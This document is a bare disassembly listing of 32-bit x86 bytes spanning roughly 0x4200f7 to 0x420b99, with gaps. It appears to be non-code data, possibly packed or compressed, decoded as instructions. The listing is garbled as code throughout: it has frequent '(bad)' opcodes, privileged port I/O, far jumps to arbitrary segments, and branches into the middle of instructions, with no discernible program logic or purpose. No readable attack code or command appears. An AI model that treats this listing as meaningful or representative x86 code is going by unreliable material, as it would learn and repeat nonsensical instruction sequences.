  4200f7:	add    BYTE PTR [edx+ecx*1-0x36a47435],0x33
  4200ff:	sbb    eax,0xa22c7b5
  420104:	lods   eax,DWORD PTR ds:[esi]
  420105:	test   bh,ah
  420107:	cmp    BYTE PTR [edi-0x4b6156cd],ah
  42010d:	add    eax,0xd56ab6c2
  420112:	dec    ebx
  420113:	jno    0x4200be
  420115:	imul   esi,DWORD PTR [ecx+0x29ef1dbe],0x54
  42011c:	(bad)  
  42011d:	and    DWORD PTR [edx-0x44],ecx
  420120:	sbb    DWORD PTR [ebx],ecx
  420122:	pop    edi
  420123:	int3   
  420124:	fimul  DWORD PTR [ebp*4+0x3edfe5e9]
  42012b:	jp     0x42011f
  42012d:	sbb    DWORD PTR ss:[edx-0x5c],edx
  420131:	aam    0xd3
  420133:	sbb    BYTE PTR [eax],ah
	...
  420195:	add    BYTE PTR [ebx-0x31],dh
  420198:	fwait
  420199:	cmp    DWORD PTR [edi+0x5dcff37d],edi
  42019f:	xchg   ebp,eax
  4201a0:	xchg   ebx,eax
  4201a1:	dec    edi
  4201a2:	fiadd  DWORD PTR [edx+ebx*8+0x50]
  4201a6:	jnp    0x4201fc
  4201a8:	add    DWORD PTR [eax],eax
  4201aa:	pop    es
  4201ab:	add    DWORD PTR [eax],eax
  4201ad:	add    BYTE PTR [ebx],cl
  4201af:	jnp    0x420191
  4201b1:	cmp    BYTE PTR [esi+0x1],bl
  4201b4:	xchg   ebp,eax
  4201b5:	jecxz  0x420137
  4201b7:	js     0x420234
  4201b9:	mov    dh,0xbe
  4201bb:	rol    DWORD PTR [ebx+0x7746c462],0xed
  4201c2:	inc    ebx
  4201c3:	jnp    0x420176
  4201c5:	mov    BYTE PTR [edx-0x4ceb8bd6],ah
  4201cb:	xchg   esp,eax
  4201cc:	mov    ebx,0xda4cfe8
  4201d1:	xor    esi,ecx
  4201d3:	pop    ebx
  4201d4:	out    0x54,al
  4201d6:	adc    BYTE PTR [edx],0x3f
  4201d9:	dec    ebp
  4201da:	mov    al,ds:0xad72b1da
  4201df:	jns    0x420170
  4201e1:	push   edx
  4201e2:	ret    
  4201e3:	mov    ds:0x54f186f8,eax
  4201e8:	sub    BYTE PTR [ecx+0x2b8cb66e],dl
  4201ee:	add    esi,DWORD PTR [ecx+0x60]
  4201f1:	mov    ecx,0xa2e5ed4f
  4201f6:	stos   BYTE PTR es:[edi],al
  4201f7:	jg     0x4201a0
  4201f9:	cmp    al,0xa9
  4201fb:	pusha  
  4201fc:	cmp    BYTE PTR [esp+esi*1],bl
  4201ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420200:	ins    BYTE PTR es:[edi],dx
  420201:	adc    edi,ecx
  420203:	jno    0x4201f6
  420205:	fiadd  DWORD PTR [ecx+0x36]
  420208:	xchg   DWORD PTR [edi],ecx
  42020a:	mov    ecx,0xbc1dcaff
  42020f:	mov    esi,0xc7809fbc
  420214:	into   
  420215:	push   eax
  420216:	out    0xf4,eax
  420218:	sbb    DWORD PTR [esp+eiz*4-0xca01a39],ebp
  42021f:	push   eax
  420220:	sub    esp,DWORD PTR [edi]
  420222:	ds pop ebx
  420224:	adc    eax,0xe305a31a
  420229:	imul   eax,ebp,0x44ab731
  42022f:	fldcw  WORD PTR [ebp-0x35f77768]
  420235:	retf   0x3e33
  420238:	je     0x42027d
  42023a:	mov    eax,0x9998addc
  42023f:	pushf  
  420240:	push   ds
  420241:	lea    esp,[eax]
  420243:	mov    al,ds:0x8a6df68
  420248:	jnp    0x4201d2
  42024a:	xor    eax,DWORD PTR [eax]
  42024c:	mov    ebx,0x8718816b
  420251:	adc    ebp,edi
  420253:	mov    bl,0x5e
  420255:	add    bh,BYTE PTR [ebx+esi*8]
  420258:	fldenv [eax]
  42025a:	fs dec ebp
  42025c:	and    ecx,DWORD PTR [ebx+0x66]
  42025f:	fs jne 0x420203
  420262:	jecxz  0x4202c6
  420264:	inc    edx
  420265:	jg     0x4202bf
  420267:	sar    DWORD PTR [ecx+0xc],1
  42026a:	cmp    ebp,esi
  42026c:	mov    bh,0xf5
  42026e:	(bad)  
  420272:	and    al,0x81
  420274:	out    dx,eax
  420275:	adc    esp,DWORD PTR [ebx]
  420277:	add    eax,0xd359a387
  42027c:	adc    edi,DWORD PTR [eax-0xd]
  42027f:	repz jne 0x42029b
  420282:	push   edi
  420283:	retf   
  420284:	ret    
  420285:	sub    ch,BYTE PTR [eax+0x6789951b]
  42028b:	inc    esi
  42028c:	fmul   DWORD PTR [esi-0x2a156543]
  420292:	xor    eax,0x4beac579
  420297:	sub    DWORD PTR [ebx+0x1e9539b6],ebx
  42029d:	repz add eax,0x8799e4a8
  4202a3:	jbe    0x4202c6
  4202a5:	push   edx
  4202a6:	dec    ecx
  4202a7:	dec    edx
  4202a8:	hlt    
  4202a9:	and    eax,edi
  4202ab:	(bad)  
  4202ac:	shl    ah,cl
  4202ae:	pop    esp
  4202af:	leave  
  4202b0:	add    ah,BYTE PTR [edx]
  4202b2:	dec    eax
  4202b3:	mov    edx,eax
	...
  420315:	add    BYTE PTR [ecx+0x6],al
  420318:	clc    
  420319:	mov    esi,0xff47feff
  42031e:	mov    cl,0x27
  420320:	pop    ebx
  420321:	fistp  QWORD PTR [edx]
  420323:	(bad)  
  420324:	mul    DWORD PTR [ebx]
  420326:	adc    BYTE PTR [ebp+0x1],0x0
  42032a:	pop    es
  42032b:	add    DWORD PTR [eax],eax
  42032d:	add    BYTE PTR [edx],ah
  42032f:	popa   
  420330:	cld    
  420331:	xor    cl,al
  420333:	and    BYTE PTR [edi],bl
  420335:	xor    eax,0x658fa36a
  42033a:	pop    ss
  42033b:	xchg   ecx,eax
  42033c:	xchg   edx,eax
  42033d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42033e:	inc    edx
  42033f:	dec    esp
  420340:	(bad)  
  420342:	mov    ds:0xadd874a3,al
  420347:	inc    ecx
  420348:	aam    0x78
  42034a:	add    bl,al
  42034c:	cmp    BYTE PTR [ebx+0x17f8b402],0x61
  420353:	jp     0x420360
  420355:	mov    ds:0xe834d7ff,al
  42035a:	xchg   ecx,eax
  42035b:	cli    
  42035c:	in     eax,dx
  42035d:	aam    0xb
  42035f:	loop   0x420381
  420361:	adc    al,0x2f
  420363:	out    dx,al
  420364:	adc    edx,DWORD PTR [edx]
  420366:	add    BYTE PTR [ebp-0x393bd8b7],cl
  42036c:	sbb    BYTE PTR [esi],dl
  42036e:	push   ebp
  42036f:	add    DWORD PTR [esi-0x13634adf],ecx
  420375:	adc    BYTE PTR [esi-0x78bc7825],0x83
  42037c:	adc    ebx,eax
  42037e:	mov    esi,0xfacb5f3e
  420383:	cmp    ah,BYTE PTR [ebx+0x35]
  420386:	jb     0x420396
  420388:	or     al,0xf
  42038a:	xchg   ebx,eax
  42038b:	fiadd  WORD PTR [edx]
  42038d:	rcl    eax,1
  42038f:	or     ecx,DWORD PTR [edi-0x577c434c]
  420395:	lods   al,BYTE PTR ds:[esi]
  420396:	ins    DWORD PTR es:[edi],dx
  420397:	cmp    eax,0xe26cc163
  42039c:	lds    eax,FWORD PTR [ebp+0x77]
  42039f:	and    bl,BYTE PTR [eax]
  4203a1:	lock xor eax,0x44124ae2
  4203a7:	lods   eax,DWORD PTR ds:[esi]
  4203a8:	imul   eax,DWORD PTR [ecx+0x79662d31],0x8c3895ca
  4203b2:	adc    ch,ah
  4203b4:	ja     0x420382
  4203b6:	push   0x4030ba4e
  4203bb:	js     0x42035d
  4203bd:	push   ss
  4203be:	ja     0x42039a
  4203c0:	aad    0x65
  4203c2:	cmp    dl,BYTE PTR [ebx]
  4203c4:	mov    ?,WORD PTR [eax-0x7a]
  4203c7:	cmp    al,0xb6
  4203c9:	pop    ebx
  4203ca:	inc    ebp
  4203cb:	mov    bl,0xe1
  4203cd:	mov    edi,0x897c3032
  4203d2:	mov    edx,0xc1b3deb2
  4203d7:	push   es
  4203d8:	sahf   
  4203d9:	jp     0x420385
  4203db:	ret    0x5c71
  4203de:	or     al,0xef
  4203e0:	mov    esp,es
  4203e2:	dec    edx
  4203e3:	outs   dx,BYTE PTR ds:[esi]
  4203e4:	add    al,0x8e
  4203e6:	jne    0x4203bc
  4203e8:	adc    BYTE PTR [eax+ecx*8-0x12fae4c0],cl
  4203ef:	pop    ebp
  4203f0:	xchg   edx,eax
  4203f1:	mov    bh,0xd5
  4203f3:	dec    edx
  4203f4:	push   ebp
  4203f5:	and    al,0x42
  4203f7:	push   esp
  4203f8:	(bad)  
  4203f9:	jg     0x420436
  4203fb:	lea    ebx,[ebp-0x57687fa0]
  420401:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420402:	mov    bh,0x54
  420404:	pop    es
  420405:	div    eax
  420407:	pushf  
  420408:	xchg   esi,eax
  420409:	mov    ah,0x57
  42040b:	xchg   esp,eax
  42040c:	and    eax,ebx
  42040e:	inc    edx
  42040f:	std    
  420410:	rcl    BYTE PTR [ebx+0x6198f798],cl
  420416:	dec    ecx
  420417:	xchg   BYTE PTR [ecx+ebx*4],cl
  42041a:	repz daa 
  42041c:	(bad)  
  42041e:	xor    bh,al
  420420:	xor    esp,ebx
  420422:	outs   dx,DWORD PTR ds:[esi]
  420423:	sub    BYTE PTR ds:0xd66942a1,ch
  420429:	dec    ebx
  42042a:	xlat   BYTE PTR ds:[ebx]
  42042b:	sbb    ebx,DWORD PTR [eax-0x68232033]
  420431:	test   eax,0xc9e429
	...
  420496:	scas   al,BYTE PTR es:[edi]
  420497:	xchg   esp,eax
  420498:	push   edi
  420499:	adc    bh,BYTE PTR [edi-0x2d]
  42049c:	out    dx,eax
  42049d:	mov    esp,0xb41496f0
  4204a2:	inc    edx
  4204a3:	pop    ss
  4204a4:	sbb    ecx,DWORD PTR ss:[ecx+0x7000156]
  4204ab:	add    DWORD PTR [eax],eax
  4204ad:	add    cl,bl
  4204af:	adc    DWORD PTR [esi-0x62de4ce],edi
  4204b5:	mov    ecx,0x6958ae6e
  4204ba:	pop    es
  4204bb:	enter  0x2e89,0x6b
  4204bf:	push   ebx
  4204c0:	and    eax,0xd501f6d7
  4204c5:	cs sbb al,0x2d
  4204c8:	lds    ecx,FWORD PTR [eax-0x3c9edea3]
  4204ce:	mov    ch,0x2d
  4204d0:	sub    al,0xc1
  4204d2:	in     al,dx
  4204d3:	pop    eax
  4204d4:	(bad)  
  4204d5:	scas   eax,DWORD PTR es:[edi]
  4204d6:	jmp    0x52f86959
  4204db:	jns    0x420533
  4204dd:	scas   eax,DWORD PTR es:[edi]
  4204de:	loop   0x420464
  4204e0:	jmp    0x4204a8
  4204e2:	test   eax,0x940aefc5
  4204e7:	pop    edi
  4204e8:	mov    ds:0xe6e19eef,al
  4204ed:	popa   
  4204ee:	adc    BYTE PTR [edx-0x3adb31e],bh
  4204f4:	or     eax,0xc879823e
  4204f9:	push   ebx
  4204fa:	add    DWORD PTR [eax+0x183795a9],edi
  420500:	mov    eax,0xdcd99498
  420505:	sbb    al,0xa0
  420507:	rcr    BYTE PTR [eax-0x26],1
  42050a:	mov    esi,0x2ec51f1b
  42050f:	addr16 adc al,0x9a
  420512:	jl     0x420572
  420514:	xor    DWORD PTR [ebx-0x51],ebx
  420517:	loopne 0x4204df
  420519:	fldcw  WORD PTR [esi-0x6a5ff769]
  42051f:	sbb    eax,0x70ff7d33
  420524:	out    dx,al
  420525:	shr    BYTE PTR ss:[ebp-0x6716cbf0],cl
  42052c:	mov    eax,0xce90e86b
  420531:	and    eax,0x8c1d9449
  420536:	jnp    0x42053a
  420538:	push   ebp
  420539:	icebp  
  42053a:	call   0x396b:0xde1215ff
  420541:	push   edx
  420542:	push   ss
  420543:	lea    esi,[ecx]
  420545:	mov    dh,BYTE PTR [edi+0x78]
  420548:	shr    ebx,cl
  42054a:	pop    edx
  42054b:	xchg   esp,eax
  42054c:	pop    ds
  42054d:	dec    ebp
  42054e:	pop    edx
  42054f:	adc    eax,DWORD PTR [edx]
  420551:	pop    ds
  420552:	and    ebp,DWORD PTR [ecx+ecx*2]
  420555:	ficomp DWORD PTR ds:0x7164cece
  42055b:	mov    DWORD PTR [edi+0x7715f2c4],ebx
  420561:	jp     0x420526
  420563:	sbb    bl,ah
  420565:	and    DWORD PTR [edx+0x2642310d],eax
  42056b:	test   BYTE PTR [ebp+ecx*8-0x36230f83],cl
  420572:	mov    ebx,0xd7551e4d
  420577:	daa    
  420578:	test   al,0xdf
  42057a:	sub    bh,BYTE PTR [esi+esi*4+0x6cd784d8]
  420581:	inc    edx
  420582:	je     0x4205a6
  420584:	aas    
  420585:	mov    dh,0x7b
  420587:	call   0x1aab:0x3b2db20f
  42058e:	xor    al,0x9c
  420590:	stos   BYTE PTR es:[edi],al
  420591:	xchg   ebp,ebp
  420593:	daa    
  420594:	jno    0x420537
  420596:	and    al,0x32
  420598:	xor    eax,0x61a0380a
  42059d:	mov    eax,ds:0x346d450c
  4205a2:	mov    al,ds:0x776afff
  4205a7:	mov    ds:0x11668f9e,al
  4205ac:	std    
  4205ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4205ae:	mov    eax,0x9cb1a595
  4205b3:	xor    ecx,DWORD PTR [edi+0x0]
	...
  420615:	add    BYTE PTR [eax+ebp*2-0x2703f748],al
  42061c:	mov    ah,0xec
  42061e:	btc    DWORD PTR [edx],edx
  420621:	mov    ebx,0x1471cbd7
  420626:	nop
  420627:	push   edi
  420628:	add    DWORD PTR [eax],eax
  42062a:	pop    es
  42062b:	add    DWORD PTR [eax],eax
  42062d:	add    BYTE PTR [ebp-0x25],al
  420630:	push   esp
  420631:	leave  
  420632:	mov    eax,0x68e61182
  420637:	adc    BYTE PTR [edi-0x1f013c1],al
  42063d:	xchg   ebp,eax
  42063e:	lahf   
  42063f:	add    ecx,edi
  420641:	push   ebp
  420642:	mov    ebx,0xdf1e3979
  420647:	retf   
  420648:	xor    DWORD PTR [esi],edi
  42064a:	and    ebp,DWORD PTR [edi-0x50]
  42064d:	sbb    eax,0x541c2b09
  420652:	shl    DWORD PTR [edi-0x515d9cf7],1
  420658:	arpl   dx,dx
  42065a:	sub    al,0xef
  42065c:	pop    edx
  42065d:	lods   eax,DWORD PTR ds:[esi]
  42065e:	xor    BYTE PTR [ebx+0x3b0baaf8],al
  420664:	lds    eax,FWORD PTR [ebp+0x5563b607]
  42066a:	pop    ecx
  42066b:	adc    eax,0xfdcc45b2
  420670:	in     eax,0xb9
  420672:	enter  0xcda9,0x5c
  420676:	jne    0x420638
  420678:	lock cdq 
  42067a:	xor    edi,DWORD PTR [ecx-0xe]
  42067d:	loope  0x420630
  42067f:	xchg   ecx,eax
  420680:	dec    esi
  420681:	mov    al,ds:0x4c0c141c
  420686:	addr16 push ecx
  420688:	mov    al,ds:0x7b86c4a9
  42068d:	(bad)  
  42068e:	push   ds
  42068f:	popf   
  420690:	jle    0x420711
  420692:	mov    dl,0x5e
  420694:	(bad)
  420698:	pop    eax
  420699:	fst    QWORD PTR [esi]
  42069b:	dec    esi
  42069c:	imul   ecx,DWORD PTR [edi],0x11e9b98f
  4206a2:	ret    
  4206a3:	mov    ebx,0x93c63981
  4206a8:	fucomp st(4)
  4206aa:	jne    0x4206f2
  4206ac:	clc    
  4206ad:	push   ds
  4206ae:	mov    dl,0x87
  4206b0:	lods   eax,DWORD PTR ds:[esi]
  4206b1:	xor    al,BYTE PTR [ecx+0x22]
  4206b4:	jbe    0x42067d
  4206b6:	jp     0x420702
  4206b8:	dec    ebp
  4206b9:	fs or  eax,0x1a3372f2
  4206bf:	mov    dl,0x2a
  4206c1:	ficomp DWORD PTR [eax-0x3405e23f]
  4206c7:	cmp    DWORD PTR fs:[esi+edi*1],edi
  4206cb:	icebp  
  4206cc:	call   DWORD PTR [eax-0x3a]
  4206cf:	(bad)  
  4206d0:	mov    dl,0x1f
  4206d2:	cmp    DWORD PTR [esi+0x6068236d],edx
  4206d8:	ins    DWORD PTR es:[edi],dx
  4206d9:	xchg   DWORD PTR [edx-0x54],ebx
  4206dc:	pop    es
  4206dd:	fld    DWORD PTR [ecx+ebx*2]
  4206e0:	mov    ds:0xb1bb37cd,eax
  4206e5:	pop    edx
  4206e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4206e7:	bound  edx,QWORD PTR [esi-0x25]
  4206ea:	jle    0x420760
  4206ec:	mov    al,0xdc
  4206ee:	cdq    
  4206ef:	lods   eax,DWORD PTR ds:[esi]
  4206f0:	push   ecx
  4206f1:	clc    
  4206f2:	dec    ebx
  4206f3:	fsubr  DWORD PTR [esi+0x4c2f57dd]
  4206f9:	ret    0x9e45
  4206fc:	in     eax,dx
  4206fd:	loope  0x42068c
  4206ff:	push   ss
  420700:	aam    0x66
  420702:	jle    0x4206a3
  420704:	aaa    
  420705:	mov    dh,0x55
  420707:	cwde   
  420708:	inc    edi
  420709:	nop
  42070a:	xchg   esi,eax
  42070b:	hlt    
  42070c:	fmul   DWORD PTR ds:0x7bda7a88
  420712:	push   esp
  420713:	mov    eax,0xb9e315d0
  420718:	call   0xe1d208b8
  42071d:	adc    edi,DWORD PTR [ebp-0x6f320c07]
  420723:	xchg   esp,eax
  420724:	arpl   WORD PTR [esi-0x13],ax
  420727:	gs push ss
  420729:	push   esp
  42072a:	cmp    eax,0x8360c334
  42072f:	call   0x75eead3c
  420734:	pushf  
	...
  420795:	add    BYTE PTR [ecx-0x587fdad1],cl
  42079b:	mov    ch,BYTE PTR [ebp-0x642816d1]
  4207a1:	sub    edi,edx
  4207a3:	in     eax,dx
  4207a4:	in     eax,dx
  4207a5:	out    0x97,eax
  4207a7:	pop    eax
  4207a8:	add    DWORD PTR [eax],eax
  4207aa:	pop    es
  4207ab:	add    DWORD PTR [eax],eax
  4207ad:	add    ah,dl
  4207af:	pop    ecx
  4207b0:	sub    eax,0x7a8bf1e0
  4207b5:	(bad)  
  4207b6:	in     eax,0x27
  4207b8:	dec    ebx
  4207b9:	mov    eax,esi
  4207bb:	retf   
  4207bc:	add    al,0x8b
  4207be:	aas    
  4207bf:	and    dh,BYTE PTR [edx-0x6]
  4207c2:	ins    DWORD PTR es:[edi],dx
  4207c3:	repz and esi,DWORD PTR ds:0x1c355a52
  4207ca:	rcl    cl,cl
  4207cc:	pop    edx
  4207cd:	fisttp DWORD PTR [ecx]
  4207cf:	cmp    eax,0xe05d7d69
  4207d4:	sub    DWORD PTR [ebx-0x6d],ebx
  4207d7:	int    0xf9
  4207d9:	loope  0x42080e
  4207db:	or     ecx,DWORD PTR [eax+ecx*1+0x43]
  4207df:	sbb    edi,eax
  4207e1:	das    
  4207e2:	aad    0xf3
  4207e4:	lods   al,BYTE PTR ds:[esi]
  4207e5:	inc    edi
  4207e6:	dec    edx
  4207e7:	and    ecx,DWORD PTR [edi+ebp*2+0x68]
  4207eb:	leave  
  4207ec:	adc    al,0x7f
  4207ee:	jmp    0xd520:0xbb217fb
  4207f5:	push   ebx
  4207f6:	add    eax,0xcfc64d81
  4207fb:	cli    
  4207fc:	icebp  
  4207fd:	lahf   
  4207fe:	gs es xchg esi,eax
  420801:	mov    dh,0x79
  420803:	out    0x23,al
  420805:	aam    0xb6
  420807:	add    al,0xdd
  420809:	mov    cs,WORD PTR [edi]
  42080b:	push   0x91a42d98
  420810:	pop    esi
  420811:	inc    ebx
  420812:	push   ds
  420813:	mov    ecx,0x9f43d949
  420818:	test   eax,0xb46e9595
  42081d:	sbb    eax,0x742f1294
  420822:	aad    0xd0
  420824:	cmc    
  420825:	push   cs
  420826:	jp     0x420859
  420828:	mov    al,0x3a
  42082a:	jge    0x420876
  42082c:	push   ecx
  42082d:	aam    0xf9
  42082f:	mov    DWORD PTR [eax-0x40c70418],eax
  420835:	push   ecx
  420836:	xor    BYTE PTR [ecx+0xb],al
  420839:	xor    BYTE PTR [ebp-0x27],dl
  42083c:	pushf  
  42083d:	ja     0x4207c9
  42083f:	fwait
  420840:	inc    esp
  420841:	mov    dh,0x2c
  420843:	cmp    cl,BYTE PTR [ebx+0x61]
  420846:	xor    BYTE PTR [edx-0xb],bh
  420849:	lods   al,BYTE PTR ds:[esi]
  42084a:	adc    DWORD PTR [eax+0x4479f51b],ebp
  420850:	add    bl,BYTE PTR [ecx]
  420852:	inc    eax
  420853:	pop    ds
  420854:	adc    ebp,DWORD PTR ds:[ecx]
  420857:	(bad)  
  420859:	mov    al,0x55
  42085b:	inc    edx
  42085c:	inc    eax
  42085d:	xchg   ecx,eax
  42085e:	icebp  
  42085f:	and    eax,0x1730d552
  420864:	mov    edx,DWORD PTR [eax-0x5c]
  420867:	fwait
  420868:	mov    dh,0x69
  42086a:	push   0x4eab5856
  42086f:	inc    edi
  420870:	hlt    
  420871:	int    0x84
  420873:	call   0xe720:0x2e6c9e96
  42087a:	mov    cl,BYTE PTR [edi]
  42087c:	popa   
  42087d:	and    al,0xc3
  42087f:	std    
  420880:	xor    eax,0x5df2f0a4
  420885:	inc    edi
  420886:	(bad)  
  420887:	mov    dh,bl
  420889:	outs   dx,BYTE PTR ds:[esi]
  42088a:	addr16 push edi
  42088c:	cs nop
  42088e:	lock dec ebp
  420890:	mov    esp,0xdc1c9824
  420895:	(bad)  
  420896:	push   ecx
  420897:	fcomp  QWORD PTR [esi]
  420899:	jmp    0xa594:0x78161f6a
  4208a0:	test   DWORD PTR [ecx+0xa],edx
  4208a3:	pop    ecx
  4208a4:	mov    DWORD PTR ss:[ebp+0x5eb077b],edi
  4208ab:	clc    
  4208ac:	mov    esi,0x49473834
  4208b1:	add    ebx,esi
  4208b3:	push   ebp
  4208b4:	jl     0x4208b6
	...
  420916:	fsub   QWORD PTR [ebx+esi*2-0x12084b3]
  42091d:	mov    ch,0x79
  42091f:	jne    0x42092f
  420921:	ret    0xa054
  420924:	push   cs
  420925:	stc    
  420926:	sahf   
  420927:	pop    ecx
  420928:	add    DWORD PTR [eax],eax
  42092a:	pop    es
  42092b:	add    DWORD PTR [eax],eax
  42092d:	add    al,bl
  42092f:	jb     0x420908
  420931:	adc    BYTE PTR [ecx-0x49],ch
  420934:	mov    ch,dl
  420936:	jp     0x42096c
  420938:	push   edx
  420939:	mov    ecx,0xcd875f58
  42093e:	aaa    
  42093f:	(bad)  
  420940:	ins    DWORD PTR es:[edi],dx
  420941:	ds cdq 
  420943:	cmp    DWORD PTR [ebx+0x6c],esi
  420946:	pop    es
  420947:	jne    0x42096e
  420949:	call   0xa124f79a
  42094e:	(bad)  
  42094f:	mov    eax,0x58d1cdc1
  420954:	jle    0x4208f6
  420956:	aas    
  420957:	addr16 loop 0x420964
  42095a:	jae    0x42094f
  42095c:	gs out 0x19,eax
  42095f:	out    dx,al
  420960:	out    0xb7,al
  420962:	dec    esp
  420963:	pop    ss
  420964:	movsx  ebp,WORD PTR [edi-0x5d]
  420968:	or     eax,0xc5c37b3c
  42096d:	idiv   DWORD PTR [eax]
  42096f:	sbb    ebx,DWORD PTR [ebx]
  420971:	jne    0x4209d8
  420973:	adc    BYTE PTR [edx],ah
  420975:	in     al,0x84
  420977:	jno    0x42090e
  420979:	dec    esp
  42097a:	push   ds
  42097b:	push   ss
  42097c:	cmp    BYTE PTR [ecx+0x66],al
  42097f:	inc    edi
  420980:	inc    ecx
  420981:	rcl    BYTE PTR [ebx+0x55072c8f],cl
  420987:	neg    BYTE PTR [eax]
  420989:	imul   esp,DWORD PTR [esi-0x7b],0x8721f5b1
  420990:	(bad)  
  420991:	pop    eax
  420992:	cwde   
  420993:	std    
  420994:	xchg   ebp,eax
  420995:	sbb    al,0x86
  420997:	jmp    0x450a:0x69976b6a
  42099e:	daa    
  42099f:	out    0x0,al
  4209a1:	pushf  
  4209a2:	sbb    ebx,esi
  4209a4:	and    DWORD PTR [edi+eax*2+0x15fff35f],ebx
  4209ab:	and    eax,0xb1018454
  4209b0:	inc    eax
  4209b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209b2:	mov    ecx,0x907ccb8c
  4209b7:	fld    DWORD PTR [ecx+0x611cfa9e]
  4209bd:	mov    eax,0xa8d5511b
  4209c2:	lods   eax,DWORD PTR ds:[esi]
  4209c3:	bnd jl 0x4209b4
  4209c6:	imul   edi,eax,0x75
  4209c9:	and    bh,dh
  4209cb:	stc    
  4209cc:	aam    0x4f
  4209ce:	inc    ebp
  4209cf:	pop    ebx
  4209d0:	out    0xd1,al
  4209d2:	js     0x42099a
  4209d4:	fsub   QWORD PTR [edx-0x2bd7583d]
  4209da:	mov    BYTE PTR [esi+0x31],dl
  4209dd:	test   edx,eax
  4209df:	jmp    0xd6a3:0xe4326c1c
  4209e6:	mov    ch,BYTE PTR [edi+0x2bdb7902]
  4209ec:	repnz pop eax
  4209ee:	jns    0x420a64
  4209f0:	adc    eax,0xb54b86a9
  4209f5:	or     al,0x62
  4209f7:	leave  
  4209f8:	and    cl,dh
  4209fa:	ret    
  4209fb:	ss or  eax,0xf6e72ff8
  420a01:	cmp    ch,BYTE PTR [ecx-0x2]
  420a04:	icebp  
  420a05:	xor    ecx,DWORD PTR [edi-0x5ec76a8e]
  420a0b:	jno    0x420a58
  420a0d:	retf   0xe400
  420a10:	(bad)  
  420a11:	mov    eax,0xe8beb274
  420a16:	xchg   esi,eax
  420a18:	test   DWORD PTR [edx+0x7ff566e0],ecx
  420a1e:	stos   BYTE PTR es:[edi],al
  420a1f:	pop    ds
  420a20:	aaa    
  420a21:	fldcw  WORD PTR [ebx-0x40727efc]
  420a27:	fisubr DWORD PTR [edi]
  420a29:	mov    dh,0x35
  420a2b:	pop    DWORD PTR [esi+ebp*4]
  420a2e:	jne    0x420aaf
  420a30:	sahf   
  420a31:	mov    esi,0x5f5251
	...
  420a96:	fbstp  TBYTE PTR [edx]
  420a98:	scas   eax,DWORD PTR es:[edi]
  420a99:	adc    ebp,edi
  420a9b:	lahf   
  420a9c:	(bad)  
  420a9d:	(bad)  
  420a9e:	(bad)  
  420aa0:	std    
  420aa1:	test   bl,dh
  420aa3:	(bad)  
  420aa4:	cli    
  420aa5:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420aa7:	pop    edx
  420aa8:	add    DWORD PTR [eax],eax
  420aaa:	pop    es
  420aab:	add    DWORD PTR [eax],eax
  420aad:	add    BYTE PTR [edi-0x4212b89f],cl
  420ab3:	mov    edi,esp
  420ab5:	popf   
  420ab6:	dec    ebx
  420ab7:	fiadd  WORD PTR ds:0x42b1f3cd
  420abd:	adc    BYTE PTR [edx-0x1f5ef2f7],bl
  420ac3:	call   0xdcfbef09
  420ac8:	or     ebp,DWORD PTR [edx]
  420aca:	out    0x9e,eax
  420acc:	pop    esi
  420acd:	cmp    BYTE PTR ds:0xca055923,cl
  420ad3:	in     eax,0x5f
  420ad5:	inc    ebp
  420ad6:	std    
  420ad7:	sbb    al,BYTE PTR [ecx-0x91137d4]
  420add:	cmp    DWORD PTR [esi+0x1c351b93],ebx
  420ae3:	jae    0x420adc
  420ae5:	jns    0x420b56
  420ae7:	xchg   ecx,ebx
  420ae9:	push   0xffffffe6
  420aeb:	mov    ah,0x79
  420aed:	repnz inc eax
  420aef:	mov    dh,0x83
  420af1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420af2:	lahf   
  420af3:	jo     0x420b71
  420af5:	or     al,0x2a
  420af7:	push   ds
  420af8:	adc    DWORD PTR [edi-0x55],edi
  420afb:	fdivr  QWORD PTR [edx+0x53]
  420afe:	xchg   ebx,eax
  420aff:	ins    WORD PTR es:[edi],dx
  420b01:	mov    ecx,0xea5cc5c8
  420b06:	in     eax,0xa0
  420b08:	adc    esi,DWORD PTR [edi+0x6396db28]
  420b0e:	arpl   WORD PTR [ecx+esi*2],ax
  420b11:	inc    ebp
  420b12:	imul   edx,edi,0xe22d4604
  420b18:	dec    eax
  420b19:	xchg   ebx,eax
  420b1a:	imul   edi,DWORD PTR [edi-0x6ea61204],0x61
  420b21:	adc    ebx,edi
  420b23:	and    edi,ebp
  420b25:	das    
  420b26:	mov    eax,ds:0x13e0e596
  420b2b:	in     eax,dx
  420b2c:	pop    ecx
  420b2d:	les    eax,FWORD PTR [edi+0x4f119fbc]
  420b33:	adc    BYTE PTR [esi+0x49b0f482],ch
  420b39:	sbb    DWORD PTR [ebx-0x48],ebp
  420b3c:	cdq    
  420b3d:	jae    0x420b4a
  420b3f:	cmp    DWORD PTR [esi],esi
  420b41:	add    DWORD PTR [esi],esi
  420b43:	pop    esp
  420b44:	mov    esi,0xa9ea93cd
  420b49:	xor    al,0xe1
  420b4b:	sbb    ebp,ebp
  420b4d:	push   edx
  420b4e:	pop    edi
  420b4f:	xlat   BYTE PTR ds:[ebx]
  420b50:	call   0x9dd4:0x82e03e93
  420b57:	xchg   esp,eax
  420b58:	outs   dx,BYTE PTR ds:[esi]
  420b59:	in     al,dx
  420b5a:	pusha  
  420b5b:	stos   DWORD PTR es:[edi],eax
  420b5c:	rcr    DWORD PTR [ebx-0x1550b14a],cl
  420b62:	adc    eax,0x69cc0b87
  420b67:	push   edi
  420b68:	fadd   QWORD PTR [esi-0x4e]
  420b6b:	mov    al,BYTE PTR ds:0xeae4f416
  420b71:	jb     0x420b75
  420b73:	cld    
  420b74:	retf   
  420b75:	cmp    edx,DWORD PTR [edi-0x56]
  420b78:	or     cl,cl
  420b7a:	aad    0x0
  420b7c:	ja     0x420b3d
  420b7e:	push   cs
  420b7f:	cmp    esp,DWORD PTR [edi+edx*4+0x1e1e6f85]
  420b86:	inc    ebx
  420b87:	push   ebp
  420b88:	addr16 mov eax,ds:0xafc0
  420b8c:	cmp    eax,0xd776c6a7
  420b91:	sbb    DWORD PTR [edi],0xffffffda
  420b94:	or     al,0x5f
  420b96:	les    esi,FWORD PTR [edx-0x41]
  420b99:	icebp  
